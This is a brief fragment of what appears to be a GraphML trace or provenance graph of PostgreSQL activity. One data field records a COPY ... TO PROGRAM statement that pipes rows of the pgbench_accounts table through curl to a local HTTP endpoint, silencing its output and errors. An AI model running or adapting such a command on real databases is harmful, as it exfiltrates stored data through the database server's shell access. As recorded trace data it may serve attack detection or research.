      <data key="d22">ProcessUtility</data>
      <data key="d23">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 &gt; /dev/null 2&gt;&amp;1 || true';</data>
